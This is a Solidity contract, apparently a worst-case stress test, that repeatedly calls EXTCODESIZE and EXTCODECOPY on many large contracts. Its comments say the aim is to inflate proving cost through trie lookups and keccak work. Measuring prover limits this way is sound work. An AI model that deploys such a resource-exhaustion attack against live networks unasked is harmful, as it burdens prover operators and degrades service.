// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract WorstCaseAttack {
    // Based on transaction data, targets multiple large contracts
    // using the EXTCODESIZE opcode which forces loading of large bytecode
    
    // Event to log information about each contract's size
    event ContractAccessed(address indexed contractAddress, uint256 size);
    
    // Event to log the total amount of data accessed
    event AttackSummary(uint256 totalAddresses, uint256 totalBytesLoaded);
    
    /**
     * @notice Execute the attack by forcing EXTCODESIZE calls on multiple large contracts
     * @param targets Array of contract addresses to target
     */
    function executeAttack(address[] calldata targets) external {
        uint256 totalSize = 0;
        
        for (uint256 i = 0; i < targets.length; i++) {
            address target = targets[i];
            
            // Force the EVM to load the contract bytecode via EXTCODESIZE
            // This forces Merkle Patricia trie lookups and keccak operations for provers
            uint256 size = target.code.length;
            totalSize += size;
            
            emit ContractAccessed(target, size);
        }
        
        // Log summary statistics
        emit AttackSummary(targets.length, totalSize);
    }
    
    /**
     * @notice Alternative method using EXTCODECOPY for potentially higher impact
     * @param targets Array of contract addresses to target
     */
    function executeAttackWithCopy(address[] calldata targets) external {
        uint256 totalSize = 0;
        
        for (uint256 i = 0; i < targets.length; i++) {
            address target = targets[i];
            
            // Get the code size
            uint256 size = target.code.length;
            totalSize += size;
            
            // Actually copy a small portion to ensure the code is loaded
            bytes memory firstBytes = new bytes(32);
            assembly {
                extcodecopy(target, add(firstBytes, 0x20), 0, 32)
            }
            
            emit ContractAccessed(target, size);
        }
        
        emit AttackSummary(targets.length, totalSize);
    }
} 